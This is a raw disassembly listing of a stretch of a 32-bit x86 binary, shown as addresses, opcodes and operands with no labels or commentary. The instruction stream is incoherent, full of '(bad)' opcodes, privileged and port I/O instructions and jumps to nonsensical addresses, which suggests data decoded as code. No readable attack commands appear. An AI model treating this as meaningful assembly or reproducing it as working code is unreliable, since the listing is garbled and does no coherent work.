  412959:	int    0xa7
  41295b:	fcomp  QWORD PTR [esi+0x57]
  41295e:	sub    cl,BYTE PTR [ebp-0x53]
  412961:	or     al,0x62
  412963:	retf   
  412964:	and    cl,BYTE PTR [esi]
  412966:	in     eax,0xc9
  412968:	ret    0x7bca
  41296b:	pushf  
  41296c:	mov    DWORD PTR [ecx],edx
  41296e:	pop    edx
  41296f:	xchg   esi,eax
  412970:	lods   al,BYTE PTR ds:[esi]
  412971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412972:	jo     0x4128f6
  412974:	loop   0x41293d
  412976:	(bad)  
  412977:	pusha  
  412978:	dec    ebx
  412979:	pop    ebp
  41297a:	pop    esp
  41297b:	repnz xor DWORD PTR [edx],0x421d0d0b
  412982:	(bad)  
  412984:	jecxz  0x41297a
  412986:	inc    ebx
  412987:	jecxz  0x41295d
  412989:	out    dx,al
  41298a:	ror    DWORD PTR [edx],0x61
  41298d:	ror    edi,1
  41298f:	int    0x8c
  412991:	jmp    0xb32f48f3
  412996:	hlt    
  412997:	inc    esi
  412998:	xlat   BYTE PTR ds:[ebx]
  412999:	jecxz  0x412954
  41299b:	test   al,0x11
  41299d:	xchg   ebx,eax
  41299e:	das    
  41299f:	std    
  4129a0:	cld    
  4129a1:	adc    esp,edx
  4129a3:	loope  0x41295e
  4129a5:	imul   ecx,DWORD PTR [ebp+0x36],0x5a4748c4
  4129ac:	mov    ah,0x58
  4129ae:	arpl   WORD PTR [ecx+0x2dd8c5ef],bp
  4129b4:	mov    bh,0x60
  4129b6:	cmp    edx,esi
  4129b8:	add    eax,0x6987132f
  4129bd:	cli    
  4129be:	and    ah,BYTE PTR [ecx]
  4129c0:	mov    esp,0xf6593dfc
  4129c5:	pop    esp
  4129c6:	push   es
  4129c7:	mov    DWORD PTR [edx+0x56f75c8a],edx
  4129cd:	rcr    DWORD PTR [edi+ecx*1+0xb],1
  4129d1:	and    eax,0x1429cf17
  4129d6:	xchg   edi,eax
  4129d7:	les    ebp,FWORD PTR [edx]
  4129d9:	cli    
  4129da:	dec    ebp
  4129db:	push   0xffffffc9
  4129dd:	lahf   
  4129de:	(bad)  
  4129df:	jbe    0x412975
  4129e1:	inc    eax
  4129e2:	jl     0x412a17
  4129e4:	sub    esi,ecx
  4129e6:	or     edx,DWORD PTR [ebp+0x7b]
  4129e9:	out    dx,eax
  4129ea:	and    DWORD PTR [ecx],eax
  4129ec:	retf   0x770c
  4129ef:	xchg   edx,eax
  4129f0:	call   0x29256101
  4129f5:	sub    cl,BYTE PTR [edi+0x2d2734c5]
  4129fb:	inc    edi
  4129fc:	es inc ecx
  4129fe:	jle    0x412a5c
  412a00:	xchg   BYTE PTR [esi],dh
  412a02:	call   DWORD PTR [esi-0x6]
  412a05:	test   eax,0x9ccac2f1
  412a0a:	xlat   BYTE PTR ds:[ebx]
  412a0b:	jns    0x4129e5
  412a0d:	call   0xf5fc4362
  412a12:	out    0x29,al
  412a14:	repz lea ebx,[edi+0xc12b15c]
  412a1b:	fs push ebp
  412a1d:	sub    al,0x4f
  412a1f:	and    al,0xa1
  412a21:	ss cmp BYTE PTR ss:[edx+0x1f075131],0x8d
  412a2a:	add    DWORD PTR [edi],0xffffffb2
  412a2d:	ja     0x412a4b
  412a2f:	loope  0x412a3d
  412a31:	enter  0x8fc3,0x90
  412a35:	xchg   ebx,eax
  412a36:	xchg   ebp,eax
  412a37:	cmp    al,0x60
  412a39:	cwde   
  412a3a:	mov    bh,0x82
  412a3c:	cmp    eax,0xbbc77b6b
  412a41:	in     eax,dx
  412a42:	int3   
  412a43:	scas   eax,DWORD PTR es:[edi]
  412a44:	inc    ebx
  412a45:	adc    esp,esp
  412a47:	mov    ecx,0xa3ed3246
  412a4c:	aaa    
  412a4d:	retf   
  412a4e:	xchg   BYTE PTR [esi],cl
  412a50:	mov    dh,0xac
  412a52:	in     al,dx
  412a53:	test   esi,ebp
  412a55:	pop    edi
  412a56:	stos   BYTE PTR es:[edi],al
  412a57:	adc    BYTE PTR [ebx+edi*4],0x31
  412a5b:	adc    BYTE PTR [eax-0x50270ab5],ch
  412a61:	iret   
  412a62:	jge    0x412aab
  412a64:	jp     0x412acc
  412a66:	push   ecx
  412a67:	adc    DWORD PTR [edi-0x2309a46a],esp
  412a6d:	lods   eax,DWORD PTR ds:[esi]
  412a6e:	test   DWORD PTR [ecx],esi
  412a70:	cli    
  412a71:	and    eax,0x4539e4d6
  412a76:	cmp    DWORD PTR [eax-0x5cccf8f7],0x77
  412a7d:	push   esp
  412a7e:	and    BYTE PTR [eax-0x6fc4099b],0xa7
  412a85:	pop    ebp
  412a86:	jbe    0x412b00
  412a88:	mov    al,0x2
  412a8a:	retf   0xe831
  412a8d:	jnp    0x412ac1
  412a8f:	dec    ecx
  412a90:	xchg   ecx,eax
  412a91:	stos   DWORD PTR es:[edi],eax
  412a92:	mov    BYTE PTR [esi],cl
  412a94:	jbe    0x412ad3
  412a96:	xchg   ebx,eax
  412a97:	push   ds
  412a98:	fild   WORD PTR [ebx+0x42285c45]
  412a9e:	dec    eax
  412a9f:	xor    bl,BYTE PTR [esi+ebp*2+0x50]
  412aa3:	arpl   si,di
  412aa5:	sbb    eax,0x1abb74ff
  412aaa:	leave  
  412aab:	inc    edx
  412aac:	jb     0x412b19
  412aae:	test   al,0xa2
  412ab0:	out    dx,eax
  412ab1:	inc    eax
  412ab2:	push   0xffffff86
  412ab4:	sbb    eax,DWORD PTR [ecx+0x1d706d60]
  412aba:	pop    edi
  412abb:	push   ds
  412abc:	jg     0x412ae8
  412abe:	test   eax,0x282df40e
  412ac3:	out    dx,al
  412ac4:	aas    
  412ac5:	mov    ecx,0xcc0083d5
  412aca:	jns    0x412b1d
  412acc:	xor    cl,0xf7
  412acf:	add    BYTE PTR [esi+0x77],0xbb
  412ad3:	lds    edi,FWORD PTR [ecx]
  412ad5:	retf   
  412ad6:	pop    ebp
  412ad7:	(bad)  
  412ad8:	jae    0x412ac6
  412ada:	xor    BYTE PTR [eax+0x28],cl
  412add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412adf:	or     al,BYTE PTR [eax]
  412ae1:	bound  edi,QWORD PTR [edx]
  412ae3:	in     al,0x41
  412ae5:	out    dx,eax
  412ae6:	mov    eax,0x965f026e
  412aeb:	aaa    
  412aec:	push   esp
  412aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aee:	or     esi,ebx
  412af0:	shr    BYTE PTR [esi+0x39],0xe2
  412af4:	ins    BYTE PTR es:[edi],dx
  412af5:	fwait
  412af6:	jno    0x412ad2
  412af8:	jb     0x412ac5
  412afa:	mov    al,ds:0x258c67ae
  412aff:	mov    ebp,0x573b997e
  412b04:	xor    eax,0xf7e0015e
  412b09:	repnz stc 
  412b0b:	out    dx,eax
  412b0c:	sti    
  412b0d:	sub    DWORD PTR [ebx+0x67],0x25
  412b11:	in     eax,dx
  412b12:	or     BYTE PTR [ecx+0xbf73b74],dh
  412b18:	in     eax,dx
  412b19:	pop    ebp
  412b1a:	mov    edx,0x4153f5e5
  412b1f:	imul   ebp,DWORD PTR [edi+0x1f],0xf
  412b23:	mov    ch,0xb1
  412b25:	outs   dx,BYTE PTR ds:[esi]
  412b26:	sahf   
  412b27:	(bad)  
  412b28:	push   ebp
  412b29:	jecxz  0x412ad5
  412b2b:	shl    BYTE PTR [edx-0x3336f55],cl
  412b31:	sbb    BYTE PTR [edi],ch
  412b33:	mov    esp,0x7d6845b
  412b38:	jp     0x412b7f
  412b3a:	ror    dh,1
  412b3c:	sub    esp,DWORD PTR [edx+0x36cab89a]
  412b42:	je     0x412b87
  412b44:	lods   eax,DWORD PTR ds:[esi]
  412b45:	inc    ebx
  412b46:	std    
  412b47:	xchg   ebp,eax
  412b48:	push   esi
  412b49:	lds    ecx,FWORD PTR ds:0xab206a65
  412b4f:	sbb    bh,bl
  412b51:	add    dh,BYTE PTR [ecx-0x1e]
  412b54:	fwait
  412b55:	aam    0xe4
  412b57:	cmp    bl,BYTE PTR [esi+edx*8+0x73031b86]
  412b5e:	and    al,0xfe
  412b60:	test   al,0x28
  412b62:	aaa    
  412b63:	cmp    BYTE PTR [eax+0x5f],bh
  412b66:	rcr    DWORD PTR [edx+eax*4-0x8],0x38
  412b6b:	xchg   ebx,eax
  412b6c:	pop    ebp
  412b6d:	pop    edx
  412b6e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b70:	xchg   esi,eax
  412b71:	sar    BYTE PTR [ebx],1
  412b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b74:	cmp    al,0x53
  412b76:	adc    eax,DWORD PTR [esi]
  412b78:	jno    0x412b00
  412b7a:	and    esi,DWORD PTR [eax+0x3ed29798]
  412b80:	inc    eax
  412b81:	add    ah,BYTE PTR [ebx-0x536b6a62]
  412b87:	add    al,0x5f
  412b89:	or     eax,0xe2f3c1ef
  412b8e:	repz cdq 
  412b90:	aad    0x4e
  412b92:	xor    ch,BYTE PTR [ecx+0x2c78fb85]
  412b98:	adc    esi,esp
  412b9a:	mov    dh,0xd6
  412b9c:	sub    esp,DWORD PTR [esp+ecx*2-0x77]
  412ba0:	mov    fs,WORD PTR ss:[esi-0x2a]
  412ba4:	or     BYTE PTR [esi-0x47],dh
  412ba7:	dec    edx
  412ba8:	xchg   ebx,eax
  412ba9:	xchg   BYTE PTR [edx],dl
  412bab:	push   ebx
  412bac:	and    BYTE PTR [edi+0x22],0xd4
  412bb0:	jecxz  0x412b5d
  412bb2:	mov    ebp,0xe8d75b7e
  412bb7:	push   0x3e
  412bb9:	(bad)  
  412bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bbb:	adc    ebx,DWORD PTR [ebp+ebp*1-0x5bf9da8]
  412bc2:	lods   al,BYTE PTR ds:[esi]
  412bc3:	inc    edx
  412bc4:	pushf  
  412bc5:	dec    esi
  412bc6:	lahf   
  412bc7:	fwait
  412bc8:	ror    DWORD PTR [edi+edx*2+0x85a2c32],cl
  412bcf:	mov    edx,0x8413662a
  412bd4:	cmp    al,0xe1
  412bd6:	xchg   BYTE PTR [ebp-0x1b],dh
  412bd9:	jno    0x412ba5
  412bdb:	ret    0xf12d
  412bde:	inc    ebx
  412bdf:	adc    BYTE PTR [eax+edi*2-0x4b55f17d],al
  412be6:	cli    
  412be7:	add    al,0x9c
  412be9:	jns    0x412bfd
  412beb:	stc    
  412bec:	or     BYTE PTR [esi-0x11ca3780],ch
  412bf2:	dec    esp
  412bf3:	not    DWORD PTR [edi+0x3e360a10]
  412bf9:	test   eax,0x488e3e9d
  412bfe:	aas    
  412bff:	rcl    BYTE PTR [esi],cl
  412c01:	scas   al,BYTE PTR es:[edi]
  412c02:	out    0xbb,eax
  412c04:	jp     0x412b92
  412c06:	clc    
  412c07:	xor    al,0xe0
  412c09:	mov    ebx,0xd6a7a48b
  412c0e:	cmp    al,bl
  412c10:	dec    edx
  412c11:	dec    ebp
  412c12:	and    ebx,DWORD PTR [eax-0x48962229]
  412c18:	test   BYTE PTR [ecx+0x5f2f138b],dh
  412c1e:	xor    BYTE PTR [ebx],cl
  412c20:	outs   dx,DWORD PTR ds:[esi]
  412c21:	xchg   ebx,eax
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	aad    0x14
  412c25:	inc    DWORD PTR [edx]
  412c27:	iret   
  412c28:	bound  ecx,QWORD PTR [ebp+0x8]
  412c2b:	retf   
  412c2c:	in     eax,0x44
  412c2e:	pop    ebp
  412c2f:	add    al,0x7c
  412c31:	pop    es
  412c32:	mov    bh,0xbb
  412c34:	cmp    al,0x8d
  412c36:	out    dx,al
  412c37:	or     esi,DWORD PTR [edx-0xec5c77b]
  412c3d:	je     0x412c3f
  412c3f:	inc    eax
  412c40:	xchg   ebx,eax
  412c41:	nop
  412c42:	mov    eax,ds:0xf6ff081
  412c47:	into   
  412c48:	aas    
  412c49:	pop    ebx
  412c4a:	arpl   bx,bp
  412c4c:	push   ss
  412c4d:	jg     0x412c8e
  412c4f:	ret    
  412c50:	mov    eax,0x4d58f911
  412c55:	pop    ecx
  412c56:	aaa    
  412c57:	add    al,0xa2
  412c59:	add    bl,BYTE PTR [ebx]
  412c5b:	cmp    BYTE PTR [edi+0x537de1cd],ah
  412c61:	daa    
  412c62:	dec    edi
  412c63:	jno    0x412c31
  412c65:	or     BYTE PTR [esi+0x56ec8307],ah
  412c6b:	dec    ebx
  412c6c:	outs   dx,BYTE PTR ds:[esi]
  412c6d:	xchg   ah,ah
  412c6f:	xchg   esp,eax
  412c70:	xchg   esi,eax
  412c71:	fs jp  0x412c12
  412c74:	mov    esp,0xe635644c
  412c79:	or     DWORD PTR [ecx+0x77a98771],esp
  412c7f:	dec    edx
  412c80:	adc    DWORD PTR [ecx],ebx
  412c82:	inc    ebp
  412c83:	push   ss
  412c84:	in     eax,0xe
  412c86:	adc    al,0xae
  412c88:	xchg   ebx,eax
  412c89:	xor    BYTE PTR [esi-0x1370aa88],al
  412c8f:	xor    BYTE PTR [ebp-0x5f],0x0
	...
  412e6b:	add    BYTE PTR [eax],al
  412e6d:	add    BYTE PTR ds:0x55d31474,ah
  412e73:	repz out 0xf6,eax
  412e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e77:	adc    bh,BYTE PTR [esi]
  412e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e7a:	adc    dl,BYTE PTR [eax-0x1a439ce]
  412e80:	add    DWORD PTR [eax],eax
  412e82:	sbb    eax,DWORD PTR [edi]
  412e84:	add    BYTE PTR [eax],al
  412e86:	inc    edi
  412e87:	or     edi,DWORD PTR [ebp-0x17]
  412e8a:	xchg   esi,eax
  412e8b:	loop   0x412e16
  412e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e8e:	xchg   ebp,eax
  412e8f:	repz fdivr DWORD PTR [eax+0x55]
  412e93:	sti    
  412e94:	jo     0x412e93
  412e96:	and    BYTE PTR [ebx],cl
  412e98:	mov    ch,0x1f
  412e9a:	mov    WORD PTR [esi+0x5d],?
  412e9d:	push   es
  412e9e:	xchg   esi,eax
  412e9f:	inc    edx
  412ea0:	out    0x65,al
  412ea2:	(bad)  
  412ea3:	ss mov ch,0x12
  412ea6:	jmp    0x88273a20
  412eab:	mov    ds:0x2089c874,eax
  412eb0:	jns    0x412e97
  412eb2:	je     0x412e37
  412eb4:	add    DWORD PTR [esi+edi*1+0x7e5fe28c],0xfffffff8
  412ebc:	(bad)  
  412ebe:	aas    
  412ebf:	out    0x74,al
  412ec1:	(bad)  
  412ec2:	xlat   BYTE PTR ds:[ebx]
  412ec3:	je     0x412e49
  412ec5:	pushf  
  412ec6:	xchg   edi,eax
  412ec7:	adc    al,0x88
  412ec9:	pop    ds
  412eca:	iret   
  412ecb:	dec    eax
  412ecc:	pop    edx
  412ecd:	pop    ecx
  412ece:	or     eax,0xb8ec13e8
  412ed3:	and    dh,dh
  412ed5:	rcl    BYTE PTR [ebx+0x29cbe74d],1
  412edb:	pop    edx
  412edc:	repz xor cl,BYTE PTR [edi-0x7c41ad69]
  412ee3:	popa   
  412ee4:	ins    BYTE PTR es:[edi],dx
  412ee5:	pop    ecx
  412ee6:	xor    edx,DWORD PTR [ebx]
  412ee8:	push   ss
  412ee9:	jae    0x412e98
  412eeb:	pusha  
  412eec:	fidivr WORD PTR [ebx-0x4e5afec3]
  412ef2:	jg     0x412eed
  412ef4:	adc    DWORD PTR [ebx+eiz*2],esp
  412ef7:	div    BYTE PTR [eax+0x4]
  412efa:	popa   
  412efb:	push   esi
  412efc:	loop   0x412f17
  412efe:	dec    esp
  412eff:	hlt    
  412f00:	sahf   
  412f01:	jmp    0x1019:0x23305376
  412f08:	mov    edx,0xe7767d90
  412f0d:	cld    
  412f0e:	out    dx,al
  412f0f:	ja     0x412eb5
  412f11:	dec    esp
  412f12:	inc    esp
  412f13:	aam    0x1b
  412f15:	in     al,0x65
  412f17:	inc    edx
  412f18:	cwde   
  412f19:	jne    0x412f91
  412f1b:	mov    ecx,0x584ea52
  412f20:	inc    ecx
  412f21:	mov    bl,BYTE PTR [ebp+0x2b]
  412f24:	aam    0x9
  412f26:	call   0x708:0xacf527bc
  412f2d:	aad    0x4
  412f2f:	pop    ebp
  412f30:	inc    ecx
  412f31:	arpl   WORD PTR [ebx],si
  412f33:	push   0xffffffa9
  412f35:	sub    al,0x80
  412f37:	inc    esi
  412f38:	sbb    BYTE PTR [esi+edx*2+0x3a521e96],bh
  412f3f:	push   DWORD PTR [ebx-0x5939bae0]
  412f45:	dec    ebp
  412f46:	sbb    ebp,edx
  412f48:	adc    DWORD PTR [eax+0x37414e0c],edi
  412f4e:	jnp    0x412f98
  412f50:	add    BYTE PTR [esi+edx*4],dl
  412f53:	push   ebp
  412f54:	iret   
  412f55:	mov    tr2,edi
  412f58:	js     0x412fc7
  412f5a:	mov    ebp,0x2d2ef70c
  412f5f:	adc    DWORD PTR [ecx+0x5f3539d5],ebx
  412f65:	pop    ss
  412f66:	or     al,0x2a
  412f68:	push   0xffffffb1
  412f6a:	cld    
  412f6b:	(bad)
  412f6f:	(bad)  
  412f70:	mov    esp,0xdb19cd3c
  412f75:	and    bl,BYTE PTR [ecx]
  412f77:	xor    ebp,ebp
  412f79:	stos   DWORD PTR es:[edi],eax
  412f7a:	mov    BYTE PTR [eax],ah
  412f7c:	(bad)  
  412f7d:	jo     0x412f3c
  412f7f:	mov    ecx,0xc2f24c0f
  412f84:	popa   
  412f85:	jmp    FWORD PTR [ebx+0x3e267c58]
  412f8b:	xchg   ecx,eax
  412f8c:	sbb    DWORD PTR [eax-0x32],0xffffffe6
  412f90:	sbb    BYTE PTR [ecx+0x2fd9ea79],dl
  412f96:	jmp    0xb27c1bff
  412f9b:	mov    al,0xe9
  412f9d:	mov    DWORD PTR [edx],ecx
  412f9f:	push   ecx
  412fa0:	(bad)  
  412fa1:	mov    ebp,0x1bb21425
  412fa6:	jge    0x412fd1
  412fa8:	xor    BYTE PTR [esi+0x63e39007],al
  412fae:	sub    al,0x45
  412fb0:	inc    edx
  412fb1:	cli    
  412fb2:	xchg   esi,eax
  412fb3:	das    
  412fb4:	lea    eax,[ebx+0xa]
  412fb7:	les    esi,FWORD PTR ds:[ecx+esi*1-0x7ee61ae8]
  412fbf:	xlat   BYTE PTR ds:[ebx]
  412fc0:	cmp    dl,0xe0
  412fc3:	xchg   ebx,eax
  412fc4:	fiadd  WORD PTR [ebx-0x4]
  412fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fc8:	scas   al,BYTE PTR es:[edi]
  412fc9:	or     esp,DWORD PTR [ecx]
  412fcb:	sbb    bl,BYTE PTR [esi-0x6f]
  412fce:	mov    bl,0x4b
  412fd0:	call   0x790d8cad
  412fd5:	push   eax
  412fd6:	das    
  412fd7:	stc    
  412fd8:	leave  
  412fd9:	sub    DWORD PTR [eax],ebx
  412fdb:	cs xor eax,0x2f13d5b5
  412fe1:	repnz std 
  412fe3:	and    edx,DWORD PTR [edi]
  412fe5:	ret    0xb52a
  412fe8:	outs   dx,BYTE PTR ds:[esi]
  412fe9:	sbb    ch,dh
  412feb:	scas   al,BYTE PTR es:[edi]
  412fec:	rcr    DWORD PTR [ecx+0x4d],0x36
  412ff0:	push   ebp
  412ff1:	lods   eax,DWORD PTR ds:[esi]
  412ff2:	ja     0x41303f
  412ff4:	mov    dh,0x85
  412ff6:	loopne 0x413062
  412ff8:	outs   dx,BYTE PTR ds:[esi]
  412ff9:	test   eax,0xd2b81542
  412ffe:	push   esi
  412fff:	xchg   BYTE PTR [edx],dh
  413001:	(bad)  
  413002:	loopne 0x41300f
  413004:	imul   esi,eax,0x48bde5d8
  41300a:	call   0xf5f93545
  41300f:	loop   0x412ff0
  413011:	mov    BYTE PTR [ebx+0x22],cl
  413014:	stos   DWORD PTR es:[edi],eax
  413015:	das    
  413016:	jae    0x413019
  413018:	leave  
  413019:	clc    
  41301a:	mov    al,BYTE PTR [ebp-0x36e341f5]
  413020:	fcom   QWORD PTR [ecx+0x47]
  413023:	(bad)  
  413024:	fsubp  st(0),st
  413026:	inc    esp
  413027:	xchg   esp,eax
  413028:	inc    eax
  413029:	adc    DWORD PTR [ecx],0x509ad62c
  41302f:	inc    ebp
  413030:	dec    esi
  413031:	jecxz  0x41304c
  413033:	push   ebp
  413034:	in     eax,dx
  413035:	lds    ebp,FWORD PTR [ebx-0x78]
  413038:	sub    BYTE PTR [edi-0xd],al
  41303b:	mov    eax,ds:0xed7fbbab
  413040:	retf   0x6737
  413043:	dec    eax
  413044:	jecxz  0x41309d
  413046:	ret    
  413047:	icebp  
  413048:	popf   
  413049:	stos   BYTE PTR es:[edi],al
  41304a:	data16 aam 0xb8
  41304d:	and    DWORD PTR [edx+0x93d2d01],esi
  413053:	call   0xa66d5440
  413058:	int3   
  413059:	gs aad 0x8f
  41305c:	lods   eax,DWORD PTR ds:[esi]
  41305d:	jg     0x41305a
  41305f:	arpl   ax,di
  413061:	out    0xfe,eax
  413063:	inc    edi
  413064:	sub    al,0x4c
  413066:	int3   
  413067:	sbb    cl,dl
  413069:	fld    TBYTE PTR [edx]
  41306b:	addr16 aam 0x6d
  41306e:	push   ebx
  41306f:	cwde   
  413070:	sub    eax,0xfc4d9867
  413075:	popa   
  413076:	or     ch,BYTE PTR [esi+0x16]
  413079:	ins    BYTE PTR es:[edi],dx
  41307a:	fmul   st,st(0)
  41307c:	inc    edx
  41307d:	push   ecx
  41307e:	xor    esp,DWORD PTR [esi-0x3a]
  413081:	xchg   BYTE PTR [eax+0x7d],ah
  413084:	iret   
  413085:	and    eax,0x5dd185ae
  41308a:	nop
  41308b:	sub    eax,0x8f965a3d
  413090:	push   ecx
  413091:	nop
  413092:	sub    BYTE PTR ds:0xb0746c37,ah
  413098:	ror    DWORD PTR ds:0x312ae696,1
  41309e:	mov    dh,dl
  4130a0:	mov    ebp,0xb89c206a
  4130a5:	jbe    0x4130e2
  4130a7:	adc    BYTE PTR [ebx-0x3f],ah
  4130aa:	or     eax,0x31d5c4c6
  4130af:	pusha  
  4130b0:	jo     0x41310f
  4130b2:	dec    ecx
  4130b3:	ret    0x3cb7
  4130b6:	cmc    
  4130b7:	xchg   esp,eax
  4130b8:	dec    esi
  4130b9:	cmp    esi,DWORD PTR [ecx-0x34]
  4130bc:	aad    0xf6
  4130be:	neg    DWORD PTR [ecx+0x2f68e6b0]
  4130c4:	or     ch,0x98
  4130c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c8:	and    DWORD PTR [ecx],eax
  4130ca:	and    ch,cl
  4130cc:	or     dh,BYTE PTR [esi+0x973a47]
  4130d2:	jecxz  0x413080
  4130d4:	stos   BYTE PTR es:[edi],al
  4130d5:	mov    ch,0x25
  4130d7:	mov    DWORD PTR [ebp+0xe],edx
  4130da:	aad    0xfc
  4130dc:	mov    ah,0xf8
  4130de:	push   0x4b
  4130e0:	mov    dh,0xb
  4130e2:	inc    edi
  4130e3:	add    eax,edi
  4130e5:	arpl   WORD PTR [edx+ebp*4],si
  4130e8:	dec    edi
  4130e9:	jnp    0x4130e1
  4130eb:	ss js  0x4130d8
  4130ee:	or     DWORD PTR [ecx-0x4c],esi
  4130f1:	sub    esp,DWORD PTR [esi]
  4130f3:	icebp  
  4130f4:	pushf  
  4130f5:	fwait
  4130f6:	ret    
  4130f7:	or     al,0xe0
  4130f9:	sbb    ch,bh
  4130fb:	repz popa 
  4130fd:	mov    ecx,DWORD PTR [edi+0xac28153]
  413103:	jg     0x41312d
  413105:	fmul   QWORD PTR [ebx-0x324f9468]
  41310b:	jae    0x4130d8
  41310d:	cmp    DWORD PTR [ebp-0x3d311929],0x44
  413114:	fcmovnbe st,st(6)
  413116:	add    ecx,DWORD PTR ds:0x528bd1bf
  41311c:	lahf   
  41311d:	clc    
  41311e:	iret   
  41311f:	hlt    
  413120:	clc    
  413121:	mov    bh,0x5d
  413123:	iret   
  413124:	scas   al,BYTE PTR es:[edi]
  413125:	add    dl,ch
  413127:	cdq    
  413128:	scas   eax,DWORD PTR es:[edi]
  413129:	pushf  
  41312a:	sub    eax,0x5501c424
  41312f:	mov    eax,ds:0xc9515365
  413134:	je     0x4130c2
  413136:	int    0xbe
  413138:	and    DWORD PTR [ebx-0x22],ebp
  41313b:	les    ebx,FWORD PTR [eax-0x5af16dab]
  413141:	sbb    ch,BYTE PTR [esp+ebx*8-0x7859e90a]
  413148:	and    esp,DWORD PTR [ecx]
  41314a:	vmwrite esp,DWORD PTR [eax+0xcc47603]
  413151:	arpl   WORD PTR [edi+0x629d2ebc],bx
  413157:	sub    BYTE PTR [ebp+0x6f],al
  41315a:	stc    
  41315b:	mov    ecx,DWORD PTR [ebp+esi*8+0x47]
  41315f:	(bad)  
  413160:	in     eax,dx
  413161:	enter  0x9215,0x37
  413165:	add    al,BYTE PTR [ebx]
  413167:	add    BYTE PTR ds:0x9324ad01,al
  41316d:	fcmovu st,st(2)
  41316f:	sub    edx,eax
  413171:	rol    cl,0x9e
  413174:	enter  0xbf01,0x5f
  413178:	stos   DWORD PTR es:[edi],eax
  413179:	clc    
  41317a:	inc    esi
  41317b:	inc    esp
  41317c:	dec    ebx
  41317d:	xchg   ecx,eax
  41317e:	mov    dl,0xd0
  413180:	in     eax,dx
  413181:	call   0x7ae24a55
  413186:	pop    ds
  413187:	popf   
  413188:	xchg   BYTE PTR [ebp-0xc],bh
  41318b:	loopne 0x41315e
  41318d:	push   cs
  41318e:	adc    bl,BYTE PTR [edi+0x29c66843]
  413194:	sbb    DWORD PTR [ebx-0x6a],eax
  413197:	push   eax
  413198:	mov    ch,0x87
  41319a:	jae    0x41318d
  41319c:	xchg   bh,al
  41319e:	add    DWORD PTR [ebx+0x12bc1909],esp
  4131a4:	cdq    
  4131a5:	cmp    ecx,DWORD PTR [esi+0x59]
  4131a8:	push   ecx
  4131a9:	push   0xbb3a9d8d
  4131ae:	mov    bh,0x67
  4131b0:	dec    esp
  4131b1:	in     eax,0x12
  4131b3:	cdq    
  4131b4:	test   al,0xc9
  4131b6:	pop    edi
  4131b7:	pop    esi
  4131b8:	loop   0x41319a
  4131ba:	jmp    0x53c8:0xae683f36
  4131c1:	xchg   edi,eax
  4131c2:	mov    dl,0x15
  4131c4:	shl    BYTE PTR [ecx+0x15],0x23
  4131c8:	xchg   esi,eax
  4131c9:	das    
  4131ca:	xor    edx,DWORD PTR ds:0xdfc1b80e
  4131d0:	(bad)  
  4131d1:	pop    ecx
  4131d2:	cmp    eax,0x259c611a
  4131d7:	mov    edi,0x20e13c6c
  4131dc:	fcom   QWORD PTR [ebp+0x5c]
  4131df:	dec    esp
  4131e0:	fwait
  4131e1:	hlt    
  4131e2:	sbb    eax,0xf83faf14
  4131e7:	jnp    0x413262
  4131e9:	cmp    ah,BYTE PTR [ebp-0x42569cbc]
  4131ef:	bound  edi,QWORD PTR [ecx+0x61eebf9f]
  4131f5:	pop    ebx
  4131f6:	fcmovb st,st(6)
  4131f8:	pop    ebp
  4131f9:	pop    edi
  4131fa:	sbb    al,bl
  4131fc:	jle    0x413237
  4131fe:	std    
  4131ff:	dec    edi
  413200:	popf   
  413201:	in     eax,0xdf
  413203:	pop    ebx
  413204:	sbb    DWORD PTR [eax+edx*1-0x77aae974],edi
  41320b:	add    DWORD PTR [edi+esi*1+0x3706993a],ebp
  413212:	dec    esi
  413213:	lock mov ah,0x87
  413216:	sub    ah,BYTE PTR [eax-0x43]
  413219:	push   eax
  41321a:	jmp    0xb4effe58
  41321f:	xchg   DWORD PTR [edx],edi
  413221:	or     BYTE PTR ds:0xf7132a2a,dl
  413227:	mov    ebp,gs
  413229:	mov    bl,0xa5
  41322b:	mov    al,ds:0x1cb836f5
  413230:	xor    eax,0xc3f2c550
  413235:	(bad)  
  413236:	enter  0x75e4,0xac
  41323a:	aas    
  41323b:	call   0xeda0:0xedc1ee06
  413242:	fisub  DWORD PTR [esp+esi*1]
  413245:	mov    dh,0x93
  413247:	imul   ecx,DWORD PTR [esp+ebp*8-0x1c],0x2c704cf0
  41324f:	shl    DWORD PTR [ebp+0x6f],1
  413252:	mov    eax,ds:0x1aa1b12f
  413257:	inc    edx
  413258:	fs test eax,0x580b2b12
  41325e:	test   DWORD PTR [ebp-0x36],0x10a9ec72
  413265:	es imul esp,eax,0xd8483c5e
  41326c:	(bad)  
  41326d:	dec    eax
  41326e:	push   ecx
  41326f:	addr16 into 
  413271:	(bad)  
  413272:	dec    edi
  413273:	push   edi
  413274:	mov    ds,ebp
  413276:	inc    edi
  413277:	sbb    eax,0xf77a38a2
  41327c:	jmp    0x4132ec
  41327e:	or     al,0xdf
  413280:	xchg   ecx,eax
  413281:	leave  
  413282:	sub    esi,eax
  413284:	sbb    DWORD PTR [ecx],0xb892af6a
  41328a:	xor    ah,BYTE PTR [edx+0x33166c00]
  413290:	dec    eax
  413291:	lock and BYTE PTR [edi+0x20],ah
  413295:	sbb    BYTE PTR [ecx+ebx*2-0x597f182b],ch
  41329c:	stos   DWORD PTR es:[edi],eax
  41329d:	sbb    DWORD PTR [ebp-0x632af3f0],edi
  4132a3:	mov    ebp,esp
  4132a5:	dec    esi
  4132a6:	js     0x41325e
  4132a8:	inc    ecx
  4132a9:	sbb    ch,BYTE PTR [ebx+esi*1]
  4132ac:	sbb    ah,BYTE PTR [edx+edx*1-0x14]
  4132b0:	popf   
  4132b1:	mov    esi,0xda7cefde
  4132b6:	xor    ah,BYTE PTR [eax+ebp*1+0x59]
  4132ba:	stos   DWORD PTR es:[edi],eax
  4132bb:	aas    
  4132bc:	push   ecx
